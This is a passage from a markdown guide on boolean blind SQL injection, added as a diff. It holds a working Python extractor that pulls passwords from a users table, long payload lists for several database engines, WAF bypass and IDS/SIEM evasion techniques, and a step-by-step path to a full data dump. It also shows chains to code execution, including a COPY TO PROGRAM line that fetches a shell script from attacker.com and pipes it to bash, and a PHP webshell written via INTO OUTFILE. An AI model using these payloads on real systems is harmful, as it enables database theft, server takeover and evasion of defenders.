+| \`--technique=B\` | Restrict to boolean-based blind only |
+| \`--string=STR\` | String present in TRUE responses |
+| \`--not-string=STR\` | String present in FALSE responses |
+| \`--code=CODE\` | HTTP status code indicating TRUE |
+| \`--text-only\` | Strip HTML, compare text content only |
+| \`--titles\` | Compare page titles only |
+| \`--threads=N\` | Parallel extraction threads (max 10) |
+| \`--predict-output\` | Statistical character prediction for fewer queries |
+| \`--level=1-5\` | Detection depth: 2=cookies, 3=User-Agent/Referer, 5=all headers |
+| \`--risk=1-3\` | Payload aggressiveness: 2=heavy queries, 3=OR-based (can modify data) |
+| \`--tamper=SCRIPT\` | Apply WAF bypass transformation scripts |
+
+### Deep Dive: Custom Python Binary Search Script
+
+\`\`\`python
+#!/usr/bin/env python3
+"""
+Boolean Blind SQL Injection Extractor
+Binary search: 7 requests per character (ASCII range)
+Supports threading for parallel position extraction
+"""
+
+import requests
+import sys
+from concurrent.futures import ThreadPoolExecutor
+
+# --- Configuration ---
+TARGET_URL = "http://target.com/page"
+PARAM_NAME = "id"
+TRUE_INDICATOR = "Welcome"       # String present in TRUE response
+COOKIE = {"session": "abc123"}
+PROXY = {"http": "http://127.0.0.1:8080"}  # Route through Burp
+
+# Injection template -- modify per target
+PAYLOAD_TPL = "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)){op}{val}-- -"
+
+
+def send_probe(pos, op, val):
+    """Send boolean probe, return True if condition is TRUE."""
+    payload = PAYLOAD_TPL.format(pos=pos, op=op, val=val)
+    r = requests.get(
+        TARGET_URL,
+        params={PARAM_NAME: payload},
+        cookies=COOKIE,
+        proxies=PROXY,
+        timeout=10
+    )
+    return TRUE_INDICATOR in r.text
+
+
+def extract_char(pos):
+    """Extract one character at given position via binary search."""
+    lo, hi = 32, 126                       # printable ASCII range
+    while lo <= hi:
+        mid = (lo + hi) // 2
+        if send_probe(pos, ">", mid):      # char > mid?
+            lo = mid + 1
+        else:
+            if send_probe(pos, "=", mid):  # char == mid?
+                return chr(mid)
+            hi = mid - 1
+    return None
+
+
+def extract_string(length=32, workers=4):
+    """Extract full string with optional parallelism."""
+    result = {}
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = {pool.submit(extract_char, p): p for p in range(1, length + 1)}
+        for fut in futures:
+            pos = futures[fut]
+            ch = fut.result()
+            if ch:
+                result[pos] = ch
+                assembled = ''.join(result.get(i, '?') for i in range(1, max(result) + 1))
+                sys.stdout.write(f"\\r[+] {assembled}")
+                sys.stdout.flush()
+    print()
+    return ''.join(result.get(i, '') for i in range(1, length + 1)).rstrip('\\x00')
+
+
+if __name__ == "__main__":
+    print("[*] Boolean Blind SQLi Extractor (binary search)")
+    print(f"[*] Target: {TARGET_URL}")
+    password = extract_string(length=20, workers=4)
+    print(f"[+] Extracted: {password}")
+\`\`\`
+
+---
+
+## Payload Crafting
+
+### Basic Probes (15 payloads)
+
+\`\`\`sql
+' AND '1'='1                              -- TRUE: string context, no comment needed
+' AND '1'='2                              -- FALSE: string context baseline
+' AND 1=1--                               -- TRUE: numeric comparison, comment terminates
+' AND 1=2--                               -- FALSE: numeric comparison
+1 AND 1=1                                 -- TRUE: numeric context (no quotes)
+1 AND 1=2                                 -- FALSE: numeric context
+') AND ('1'='1                            -- TRUE: single-parenthesis context
+') AND ('1'='2                            -- FALSE: single-parenthesis context
+')) AND (('1'='1                          -- TRUE: double-parenthesis context
+')) AND (('1'='2                          -- FALSE: double-parenthesis context
+' OR '1'='1                               -- TRUE: always true (CAUTION: can affect UPDATE/DELETE)
+' OR '1'='2                               -- FALSE: depends on original query
+1 OR 1=1                                  -- TRUE: numeric OR context
+1>0                                       -- TRUE: mathematical confirmation (no keywords)
+2-1                                       -- TRUE: arithmetic evaluation test (?id=1 vs ?id=2-1)
+\`\`\`
+
+### Intermediate: SUBSTRING/ASCII Extraction Per DB (15 payloads)
+
+\`\`\`sql
+-- MySQL: extract first char of database name
+' AND ASCII(SUBSTRING(database(),1,1))>96--                         -- is it lowercase? (a=97)
+' AND ASCII(MID(database(),1,1))=116--                              -- is it 't'? (116)
+' AND ORD(MID(database(),1,1))>96--                                 -- ORD synonym for ASCII
+
+-- PostgreSQL: extract first char of current database
+' AND ASCII(SUBSTRING(current_database(),1,1))>96--                 -- lowercase check
+' AND ASCII(SUBSTRING(current_database() FROM 1 FOR 1))>96--       -- SQL-standard FROM/FOR syntax
+
+-- MSSQL: extract first char of database name
+' AND ASCII(SUBSTRING(DB_NAME(),1,1))>96--                          -- DB_NAME() function
+' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysdatabases),1,1))>96--  -- enumerate databases
+
+-- Oracle: extract first char of user
+' AND ASCII(SUBSTR(USER,1,1))>96--                                  -- USER function, SUBSTR not SUBSTRING
+' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>64--  -- version banner
+
+-- SQLite: extract first char of table name
+' AND UNICODE(SUBSTR((SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1),1,1))>96--
+
+-- Length determination (all DBs)
+' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10--  -- MySQL/PG/SQLite
+' AND LEN((SELECT TOP 1 password FROM users))>10--                     -- MSSQL (LEN not LENGTH)
+' AND LENGTH((SELECT password FROM users WHERE ROWNUM=1))>10--         -- Oracle
+
+-- Table existence check
+' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--  -- MySQL
+' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>3--                         -- SQLite
+\`\`\`
+
+### Advanced: CASE WHEN, Error Oracles, Conditional Responses (15 payloads)
+
+\`\`\`sql
+-- CASE WHEN true/false (works on all DBs)
+' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)='a'--         -- TRUE
+' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE 'b' END)='a'--         -- FALSE
+
+-- Error oracle: divide-by-zero on TRUE, normal on FALSE
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--         -- triggers error (TRUE)
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--         -- no error (FALSE)
+
+-- Oracle-specific error oracle
+' || (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
+
+-- MySQL EXTRACTVALUE error oracle
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT IF(ASCII(SUBSTRING(database(),1,1))>96, version(), 'x'))))--
+
+-- PostgreSQL CAST error oracle
+' AND 1=CAST((SELECT CASE WHEN (1=1) THEN '1' ELSE version() END) AS INT)--
+
+-- SQLite json() error oracle (unique technique)
+' AND CASE WHEN (1=1) THEN 1 ELSE json('') END AND 'A'='A           -- TRUE (no error)
+' AND CASE WHEN (1=2) THEN 1 ELSE json('') END AND 'A'='A           -- ERROR (false triggers json(''))
+
+-- CASE WHEN with data extraction
+' AND (SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))>96 THEN 1 ELSE 0 END FROM users WHERE username='admin')=1--
+
+-- MySQL IF() with data extraction
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96, 1, 0)=1--
+
+-- MSSQL IIF() (SQL Server 2012+)
+' AND IIF(ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96, 1, 0)=1--
+
+-- Oracle DECODE
+' AND DECODE(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1), 'a', 1, 0)=1--
+
+-- Nested subquery extraction
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)>'m')>0 THEN 1 ELSE 0 END)=1--
+
+-- MySQL ELT() alternative to IF
+' AND ELT(1+(ASCII(SUBSTRING(database(),1,1))>96), 0, 1)=1--
+\`\`\`
+
+### WAF Evasion (20 payloads)
+
+\`\`\`sql
+-- 1. Comment-based space replacement
+'/**/AND/**/ASCII(SUBSTRING(database(),1,1))>96--                    -- /**/ replaces spaces
+
+-- 2. MySQL version comments
+'/*!50000AND*/ASCII(/*!50000SUBSTRING*/(database(),1,1))>96--        -- executes on MySQL 5.0+
+
+-- 3. Tab character as whitespace
+'%09AND%09ASCII(SUBSTRING(database(),1,1))>96--                      -- %09 = horizontal tab
+
+-- 4. Newline as whitespace
+'%0AAND%0AASCII(SUBSTRING(database(),1,1))>96--                     -- %0A = line feed
+
+-- 5. Non-breaking space (MySQL only)
+'%A0AND%A0ASCII(SUBSTRING(database(),1,1))>96--                     -- %A0 = NBSP, MySQL treats as space
+
+-- 6. Random case keywords
+' AnD AsCiI(sUbStRiNg(DaTaBaSe(),1,1))>96--                        -- SQL parsers are case-insensitive
+
+-- 7. Function synonym substitution
+' AND ORD(MID(database(),1,1))>96--                                 -- ORD+MID instead of ASCII+SUBSTRING
+
+-- 8. Hex comparison (avoids quotes)
+' AND SUBSTRING(database(),1,1)=0x75--                              -- 0x75 = 'u', no quotes needed
+
+-- 9. CHAR() function (avoids string literals)
+' AND SUBSTRING(database(),1,1)=CHAR(117)--                         -- CHAR(117) = 'u'
+
+-- 10. URL double-encoding
+%2527%2520AND%25201%253D1--                                         -- double-decoded by backend
+
+-- 11. Scientific notation (bypasses libinjection)
+' or 1.e(1) or '1'='1                                              -- MySQL scientific notation abuse
+
+-- 12. JSON-in-SQL (bypassed 5 major WAFs in 2022)
+' OR JSON_EXTRACT('{"id":14}','$.id')=14--                          -- MySQL JSON function bypass
+
+-- 13. PostgreSQL JSON operator
+' OR '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb--                   -- unrecognized by WAFs
+
+-- 14. LIKE instead of = operator
+' AND SUBSTRING(database(),1,1) LIKE 0x75--                         -- LIKE as equals alternative
+
+-- 15. REGEXP/RLIKE for comparison
+' AND (SELECT password FROM users LIMIT 1) RLIKE '^a'--             -- regex match
+
+-- 16. BETWEEN for range comparison
+' AND ASCII(SUBSTRING(database(),1,1)) NOT BETWEEN 0 AND 96--       -- replaces > operator
+
+-- 17. Parentheses wrapping (no spaces)
+'AND(ASCII(SUBSTRING(database(),1,1))>96)--                         -- parentheses eliminate space need
+
+-- 18. HTTP Parameter Pollution (split across params)
+-- ?id=1'/*&id=*/AND/*&id=*/1=1--                                   -- HPP concatenation on IIS/ASP
+
+-- 19. Chunked transfer encoding (split payload across HTTP chunks)
+-- Transfer-Encoding: chunked (payload fragmented across chunk boundaries)
+
+-- 20. Unicode full-width characters
+-- %EF%BC%87 = full-width apostrophe, normalizes to ' on backend
+\`\`\`
+
+### DB-Specific (20 payloads)
+
+\`\`\`sql
+-- MySQL (5 payloads)
+' AND MAKE_SET(1,'a')='a'--                                         -- MAKE_SET boolean (MySQL-specific)
+' AND conv('a',16,2)=conv('a',16,2)--                               -- MySQL fingerprint (only TRUE on MySQL)
+' AND connection_id()=connection_id()--                              -- MySQL-only function
+' AND (SELECT super_priv FROM mysql.user WHERE user=CURRENT_USER() LIMIT 1)='Y'--  -- privilege check
+' AND SUBSTRING((SELECT GROUP_CONCAT(password) FROM users),1,1)>'a'--  -- GROUP_CONCAT multi-row
+
+-- PostgreSQL (5 payloads)
+' AND 5::int=5--                                                    -- PG type casting (fingerprint)
+' AND pg_client_encoding()=pg_client_encoding()--                   -- PG-only function
+' AND (SELECT current_setting('is_superuser'))='on'--               -- superuser check
+' AND SUBSTRING(current_database(),1,1)=$$u$$--                     -- dollar-quoted string (no quotes)
+' AND (SELECT password FROM users LIMIT 1) SIMILAR TO 'a%'--       -- PG SIMILAR TO operator
+
+-- MSSQL (5 payloads)
+' AND @@CONNECTIONS>0--                                             -- MSSQL fingerprint
+' AND IS_SRVROLEMEMBER('sysadmin')=1--                              -- sysadmin check
+' AND BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)--                   -- MSSQL-only function
+' AND IIF(SUBSTRING(DB_NAME(),1,1)='m', 1, 0)=1--                  -- IIF (MSSQL 2012+)
+' AND HAS_PERMS_BY_NAME(null, null, 'CONTROL SERVER')=1--          -- server permission check
+
+-- Oracle (3 payloads)
+' AND ROWNUM=ROWNUM--                                               -- Oracle fingerprint
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT password FROM users WHERE ROWNUM=1))--  -- CTXSYS blind
+' AND DECODE(SIGN(ASCII(SUBSTR(USER,1,1))-64),1,1,0)=1--          -- DECODE with SIGN
+
+-- SQLite (2 payloads)
+' AND sqlite_version()=sqlite_version()--                           -- SQLite fingerprint
+' AND TYPEOF(1)='integer'--                                         -- SQLite TYPEOF function
+\`\`\`
+
+### Modern Stack (10 payloads)
+
+\`\`\`sql
+-- JSON body injection (POST)
+{"username": "admin' AND 1=1--", "password": "x"}                   -- standard JSON body
+{"username": "admin' AND ASCII(SUBSTRING(database(),1,1))>96--", "password": "x"}  -- extraction
+
+-- Nested JSON
+{"filters": {"name": "admin' AND 1=1-- -"}}                        -- nested parameter
+
+-- GraphQL inline argument
+{ user(id: "1' AND 1=1-- -") { name email } }                      -- GraphQL query injection
+
+-- GraphQL variable
+{"variables": {"id": "1' AND ASCII(SUBSTRING(database(),1,1))>96-- -"}}  -- variable injection
+
+-- REST path parameter
+GET /api/users/1' AND 1=1--/profile                                 -- path segment injection
+
+-- Header injection
+User-Agent: Mozilla' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
+X-Forwarded-For: 127.0.0.1' AND 1=1--                              -- X-Forwarded-For injection
+
+-- Django ORM filter oracle
+GET /api/items/?created_by__user__password__startswith=pbkdf2       -- relational filter traversal
+
+-- Prisma ORM leak
+{"filter": {"createdBy": {"resetToken": {"startsWith": "06"}}}}    -- Prisma filter oracle
+
+-- Navidrome LIKE injection (CVE-2024-47062)
+GET /api/items?password=A%                                          -- wildcard in LIKE clause
+\`\`\`
+
+---
+
+## Exploitation (Step-by-Step)
+
+### 10 Steps: Zero to Full Data Dump
+
+**Step 1: Identify injectable parameters.** Test all inputs (GET, POST, Cookie, Header) with \`' AND '1'='1\` / \`' AND '1'='2\` pairs. Look for response differential.
+
+**Step 2: Confirm boolean blind SQLi.** Verify consistent true/false behavioral differences. Eliminate false positives from dynamic content by testing multiple times.
+
+**Step 3: Fingerprint the database engine.** Use DB-specific true conditions: \`connection_id()=connection_id()\` (MySQL), \`5::int=5\` (PostgreSQL), \`@@CONNECTIONS>0\` (MSSQL), \`ROWNUM=ROWNUM\` (Oracle), \`sqlite_version()=sqlite_version()\` (SQLite).
+
+**Step 4: Enumerate database names.** Extract current database name character by character. Then enumerate other databases via \`information_schema.schemata\` (MySQL/PG/MSSQL) or \`all_users\` (Oracle).
+
+**Step 5: Enumerate table names.** Extract from \`information_schema.tables\` (MySQL/PG/MSSQL), \`all_tables\` (Oracle), or \`sqlite_master\` (SQLite).
+
+**Step 6: Enumerate column names.** Extract from \`information_schema.columns\` (MySQL/PG/MSSQL), \`all_tab_columns\` (Oracle), or \`sql\` column of \`sqlite_master\` (SQLite).
+
+**Step 7: Determine row count and data length.** Use \`COUNT(*)\` for rows and \`LENGTH()\`/\`LEN()\` for individual field lengths before extraction.
+
+**Step 8: Extract data using binary search.** For each character position, perform binary search on ASCII value. Use \`--threads\` with sqlmap or parallel Python script for speed.
+
+**Step 9: Verify extracted data.** Log in with extracted credentials or validate extracted data against known patterns (hash formats, email patterns).
+
+**Step 10: Document findings with evidence.** Capture request/response pairs for true and false conditions, timestamps, and complete extraction output.
+
+### Post-Exploitation: Data Extraction Paths
+
+\`\`\`
+Extracted credentials --> Log in as admin --> Access admin panel
+Extracted session tokens --> Session hijack --> Full account takeover
+Extracted API keys --> Direct API access --> Lateral movement
+Extracted password hashes --> Offline cracking (hashcat) --> Credential stuffing
+\`\`\`
+
+### Chaining: SQLi to Greater Impact
+
+**SQLi to Account Takeover:**
+1. Boolean blind extract admin password hash
+2. Crack hash offline (hashcat/john)
+3. Log in as admin
+4. Full application takeover
+
+**SQLi to RCE (MSSQL):**
+\`\`\`sql
+-- Enable xp_cmdshell via stacked queries
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
+'; EXEC xp_cmdshell 'whoami'--
+\`\`\`
+
+**SQLi to RCE (PostgreSQL):**
+\`\`\`sql
+-- COPY TO PROGRAM (requires superuser)
+'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'--
+\`\`\`
+
+**SQLi to RCE (MySQL):**
+\`\`\`sql
+-- INTO OUTFILE for webshell (requires FILE privilege + writable web root)
+' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
+\`\`\`
+
+**SQLi to SSRF (Oracle):**
+\`\`\`sql
+-- UTL_HTTP forces server-side HTTP request
+' AND 1=(SELECT UTL_HTTP.REQUEST('http://internal-service:8080/admin') FROM dual)--
+\`\`\`
+
+---
+
+## Detection Evasion
+
+### What Modern Defenses Detect
+
+| Defense Layer | Detection Method | Boolean Blind Detection Rate | Bypass Difficulty |
+|--------------|-----------------|------------------------------|-------------------|
+| WAF (ModSecurity CRS) | Regex pattern matching on SQL keywords | High (PL3+) | Medium |
+| WAF (Cloudflare) | ML + signature hybrid | High | Medium-High |
+| WAF (AWS WAF managed) | Signature + libinjection | Medium | Medium |
+| IDS/IPS (Snort/Suricata) | Network packet inspection for SQL patterns | Medium | Low-Medium |
+| RASP (Contrast/Dynatrace) | In-app query monitoring | Very High | High |
+| SIEM (Splunk/ELK) | Log correlation, anomaly detection | Low (reactive) | Low |
+| DB Audit (MySQL Enterprise) | Query logging and analysis | High (post-facto) | N/A |
+
+### WAF Bypass Techniques (20 with Payloads)
+
+1. **Inline comments:** \`'/**/AND/**/1=1--\`
+2. **MySQL version comments:** \`'/*!50000AND*/1=1--\`
+3. **Tab/newline whitespace:** \`'%09AND%091=1--\`
+4. **NBSP (MySQL):** \`'%A0AND%A01=1--\`
+5. **Random case:** \`' AnD 1=1--\`
+6. **Function synonyms:** \`ORD(MID(...))\` instead of \`ASCII(SUBSTRING(...))\`
+7. **Hex encoding:** \`0x61646d696e\` instead of \`'admin'\`
+8. **CHAR() function:** \`CHAR(97,100,109,105,110)\` instead of \`'admin'\`
+9. **Double URL encoding:** \`%2527\` decodes to \`%27\` then to \`'\`
+10. **JSON-in-SQL:** \`JSON_EXTRACT('{"id":1}','$.id')=1\`
+11. **HPP (HTTP Parameter Pollution):** split payload across duplicate params
+12. **HPF (Parameter Fragmentation):** distribute across different params bridged by comments
+13. **Scientific notation:** \`1.e(1)\` as boolean true
+14. **Chunked transfer encoding:** fragment HTTP body across chunks
+15. **Unicode full-width:** \`%EF%BC%87\` (full-width apostrophe) normalizes to \`'\`
+16. **Overlong UTF-8:** \`%C0%A7\` overlong encoding of \`'\`
+17. **Content-Type switching:** URL-encoded to XML with entity encoding (\`&#x27;\` = \`'\`)
+18. **H2C smuggling:** HTTP/2 cleartext upgrade bypasses HTTP/1.1-only WAF inspection
+19. **libinjection fingerprint evasion:** \`<@\` operator, \`:=\` assignment, ODBC \`{fn}\` syntax
+20. **WAFFLED mutations:** modify multipart boundaries, Content-Type variations, CRLF mutations
+
+### IDS/SIEM Evasion
+
+- **Low request rate:** Space requests over minutes/hours to avoid volume-based alerts
+- **Randomize injection parameter:** Alternate between different injectable parameters
+- **Vary payload structure:** Use different functions (SUBSTRING vs MID vs SUBSTR) across requests
+- **Encode payloads differently per request:** Alternate between hex, URL encoding, and plain text
+- **Use legitimate User-Agent strings:** Avoid fingerprinting as automated tool
+
+### RASP Bypass
+
+RASP (Runtime Application Self-Protection) monitors SQL queries at the application layer, making bypass significantly harder. Potential approaches:
+- Second-order injection (payload stored then executed in different context, may bypass per-request RASP)
+- ORM-level filter oracles that don't generate raw SQL the RASP recognizes as injection
+- Protocol-level smuggling (DEF CON 32 technique) that operates below the RASP instrumentation layer
+
+### Minimal Footprint Techniques
+
+- Extract only what you need (target specific tables/columns)
+- Use binary search (7 requests/char) not linear scan (95 requests/char)
+- Use \`--predict-output\` in sqlmap for statistical optimization
+- Prefer bit-shifting (deterministic 7 requests) over binary search (variable 1-7)
+- Use DNS OOB exfiltration to extract entire values in single requests where possible
+
+---
+
+## Variations and Edge Cases
+
+### Content-Based vs Status-Based vs Redirect-Based Boolean
+
+| Variant | TRUE Signal | FALSE Signal | Example |
+|---------|-----------|-------------|---------|
+| Content-based | "Welcome back" in body | "Welcome back" absent | PortSwigger canonical lab |
+| Size-based | Response 4532 bytes | Response 4218 bytes | Search result count changes |
+| Status-based | HTTP 200 | HTTP 500 (error) | Conditional error oracle |
+| Redirect-based | HTTP 200 | HTTP 302 redirect | Auth check with redirect |
+| JSON-based | \`{"count": 5}\` | \`{"count": 0}\` | API returning filtered results |
+| Header-based | Different Set-Cookie | Standard Set-Cookie | Session behavior differences |
+
+### Conditional Error Variant
+
+When page content does not change between true/false, but the application handles database errors differently (200 vs 500):
+
+\`\`\`sql
+-- TRUE triggers divide-by-zero, application returns 500
+' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 'a' END)='a'--
+
+-- FALSE returns normally, application returns 200
+-- The error IS the boolean signal
+\`\`\`
+
+### LIKE-Based Boolean (Navidrome CVE-2024-47062)
+
+When a parameter is used in a LIKE clause, wildcard characters become the injection vector:
+
+\`\`\`
+GET /api/items?password=A%     -- returns results if any password starts with 'A'
+GET /api/items?password=AB%    -- narrows to passwords starting with 'AB'
+GET /api/items?username=%       -- wildcard matches ALL usernames
+\`\`\`
+
+This is not traditional SQL injection -- no quote escaping needed. The LIKE operator's wildcard semantics become the vulnerability.
+
+### INSERT/UPDATE Context Boolean
+
+When injection is in an INSERT or UPDATE statement:
+
+\`\`\`sql
+-- INSERT context: result visible in another page/API
+'; INSERT INTO logs(msg) VALUES((SELECT CASE WHEN ASCII(SUBSTRING(password,1,1))>96 THEN 'YES' ELSE 'NO' END FROM users LIMIT 1));--
+
+-- UPDATE context: modify observable data based on condition
+'; UPDATE products SET price=CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96 THEN 9999 ELSE 1 END WHERE id=1;--
+\`\`\`
+
+### Second-Order Boolean Blind
+
+The payload is stored by one request and executed by a different one:
+
+\`\`\`
+1. POST /api/report {"date": "2024-08-15' AND 1=1--"}
+   Server stores the malicious date value in database
+
+2. GET /api/report/ExportToExcel
+   Server uses stored value in new query without sanitization
+   Boolean condition evaluated in the export query context
+\`\`\`
+
+Detection pattern: inject in one endpoint, observe in another. Second-order blind is harder to detect because the injection point and observation point are decoupled.
+
+---
+
+## Modern Stack Specifics
+
+### Framework Vulnerability Patterns
+
+| Framework | Language | Safe Pattern | Vulnerable Pattern | Notes |
+|-----------|----------|-------------|-------------------|-------|
+| Django | Python | \`User.objects.filter(id=input)\` | \`User.objects.raw(f"...{input}...")\` | Also: \`extra()\`, JSONField CVE-2024-42005 |
+| Rails | Ruby | \`User.where("id = ?", input)\` | \`User.where("id = #{input}")\` | Also: \`annotate()\` CVE-2023-22794 |
+| Express/Sequelize | Node.js | \`query('...?', [input])\` | \`\` query(\`...\${input}...\`) \`\` | Template literals bypass parameterization |
+| Spring/Hibernate | Java | \`setParameter("id", input)\` | \`createQuery("..."+input)\` | HQL injection identical to SQL injection |
+| Laravel/Eloquent | PHP | \`DB::select('...?', [$input])\` | \`DB::select("...$input...")\` | PHP variable interpolation |
+| Flask/SQLAlchemy | Python | \`execute("...":id", {"id": input})\` | \`execute(f"...{input}...")\` | f-strings bypass parameterization |
+| Prisma | Node.js | \`\` $queryRaw\`...\${input}\` \`\` (tagged) | \`$queryRawUnsafe(...)\` | Tagged templates safe; raw strings not |
+| GORM | Go | \`Where("id = ?", input)\` | \`Raw(fmt.Sprintf("...%s", input))\` | Sprintf injection |
+
+### ORM Pitfalls
+
+Even when the ORM is used "correctly," certain features create injection opportunities:
+
+- **Django \`extra()\` and \`raw()\`** -- deprecated but functional; common in legacy code
+- **Django JSONField** -- CVE-2024-42005: \`values()\` and \`values_list()\` with JSONField allow key injection
+- **Rails \`annotate()\`** -- CVE-2023-22794: comment escaping allows SQL breakout
+- **Prisma \`$queryRawUnsafe\`** -- explicitly bypasses parameterization (the "Unsafe" is a hint)
+- **Any ORM's \`orderBy()\` with user input** -- ORDER BY is inherently unparameterizable in most ORMs; CVE-2024-49203 (Querydsl)
+
+### Cloud and Serverless Context
+
+- **AWS Lambda + RDS:** Same SQLi risk; Lambda timeout (15 min max) limits but does not prevent extraction
+- **Cloud SQL (GCP):** No difference in vulnerability; managed database does not prevent application-level SQLi
+- **Azure SQL:** Managed service provides audit logging but no injection prevention
+- **Serverless DB (PlanetScale, Neon):** Still vulnerable if application concatenates input
+
+### API Context (REST, GraphQL, gRPC)
+
+- **REST APIs** with JSON bodies: Injection in string fields passed to queries
+- **GraphQL**: Filter arguments, sort parameters, and nested queries are primary vectors
+- **gRPC**: Protobuf string fields passed to SQL queries (less common but possible)
+- **Batch/bulk endpoints**: Multiple injection opportunities per request; useful for parallel extraction
+
+### Headless/SPA Applications
+
+Single-page applications that communicate via XHR/fetch to API backends:
+- All injection occurs at the API level, not in form submissions
+- Response differentials may be in JSON structure rather than HTML content
+- WebSocket connections may carry injectable parameters with no WAF inspection
+
+---
+
+## Real-World Examples
+
+### Verified CVEs
+
+| CVE | CVSS | Software | Year | Boolean Blind Confirmed | Key Detail |
+|-----|------|----------|------|------------------------|------------|
+| CVE-2024-51482 | 9.9 | ZoneMinder | 2024 | Yes (explicitly stated) | \`web/ajax/event.php\` \`tid\` parameter concatenated directly. Fixed in 1.37.65. |
+| CVE-2023-32308 | 9.8 | Anuko Time Tracker | 2023 | Yes (explicitly stated) | \`invoices.php\` POST parameter. Coding error after validation. Fixed in 1.22.11.5781. |
+| CVE-2024-8924 | 7.5 | ServiceNow | 2024 | Yes (blind SQLi) | Unauthenticated blind SQLi in core platform. Xanadu and earlier. |
+| CVE-2023-51448 | 8.8 | Cacti | 2023 | Yes (blind SQLi) | \`selected_graphs_array\` parameter in \`managers.php\`. Requires Settings/Utilities permissions. |
+| CVE-2025-65093 | 5.5 | LibreNMS | 2025 | Yes (explicitly stated) | \`/ajax_output.php\` \`hostname\` parameter. PoC: \`hostname=x' AND 1=1 AND '1'='1\`. Fixed in 25.11.0. |
+| CVE-2024-1698 | 9.8 | NotificationX (WordPress) | 2024 | Yes (PoC confirms boolean) | Unauthenticated via \`/wp-json/notificationx/v1/analytics\` REST endpoint. 40,000+ installs. |
+| CVE-2024-8529 | 10.0 | LearnPress (WordPress) | 2024 | Yes (boolean-based parameter replace) | Unauthenticated via REST API. 100,000+ active installs. |
+| CVE-2023-6360 | 9.8 | My Calendar (WordPress) | 2023 | Yes (RLIKE boolean-based blind per Tenable) | \`from\`/\`to\` params in REST route. Boolean, error, and time-based all viable. |
+
+### Bug Bounty Writeups
+
+| Program | Platform | Bounty | Technique | Report |
+|---------|----------|--------|-----------|--------|
+| inDrive | HackerOne | $4,134 | Boolean blind via API path parameter | [#2051931](https://hackerone.com/reports/2051931) |
+| U.S. DoD | HackerOne | N/A (VDP) | Boolean blind via User-Agent header | [#2599826](https://hackerone.com/reports/2599826) |
+| U.S. DoD | HackerOne | N/A (VDP) | Blind SQLi via User-Agent (2nd instance) | [#2597543](https://hackerone.com/reports/2597543) |
+| Starbucks | HackerOne | Undisclosed | Blind SQLi + WAF bypass on .com.gt subdomain | [#549355](https://hackerone.com/reports/549355) |
+| Zomato | HackerOne | Part of $4,500+ | Boolean SQLi in PHP endpoints | [#301257](https://hackerone.com/reports/301257) |
+| CS Money | HackerOne | Undisclosed | Boolean blind in URI path | [#1107536](https://hackerone.com/reports/1107536) |
+| Private | Medium | $20,000 | "Super blind" SQLi requiring OOB | [writeup](https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448) |
+
+### Conference Talks
+
+| Talk | Speaker(s) | Venue | Year | Key Contribution |
+|------|-----------|-------|------|-----------------|
+| "Hakuin: Injecting Brains Into Blind SQL Injection" | Jakub Pruzinec, Dr. Nguyen Anh Quynh | HITB 2023, Black Hat MEA, HITB 2024 | 2023-2024 | ML-optimized extraction: 6x faster schema, up to 26x faster for limited-value columns |
+| "SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level" | Paul Gerste | DEF CON 32 | 2024 | Protocol-level smuggling bypassing all application-layer defenses |
+| "Advanced Blind SQL Injection" | David Caissy | DEF CON 24 | 2016 | Foundational workshop on boolean/time/error extraction + WAF bypass |
+| "Using Binary Search Algorithms for Blind SQL Injection" | Juan Pablo Quine Paz | OWASP | 2023-2024 | Mathematical optimization of extraction algorithms |
+
+### Breach Context
+
+**ResumeLooters Campaign (2023-2024):** A threat group used SQL injection and XSS against 65+ recruitment websites across 14 countries, stealing 2,079,027 email addresses and 500,000+ detailed user records. Demonstrates that SQL injection remains effective at scale against entire industry verticals. Data sold on Chinese-speaking Telegram groups.
+
+**Heartland Payment Systems (2008):** Albert Gonzalez used SQL injection (including blind techniques) to penetrate the payment processing network, exposing 130 million credit card numbers. Financial impact exceeded $140 million. Operated undetected for months.
+
+**Note on CVE-2023-34362 (MOVEit):** This was a direct SQL injection leading to webshell deployment by the Cl0p ransomware group (2,700+ organizations compromised, 93.3 million individuals affected). It was NOT boolean-based blind -- it was direct injection with immediate RCE impact. Included here for context as the largest SQLi breach in history, demonstrating the category's ongoing severity.
+
+---
+
+## Skill Progression Path
+
+### Level 0-1: Foundations
+
+| Resource | Type | URL |
+|----------|------|-----|
+| PortSwigger: Blind SQLi with conditional responses | Lab | https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses |
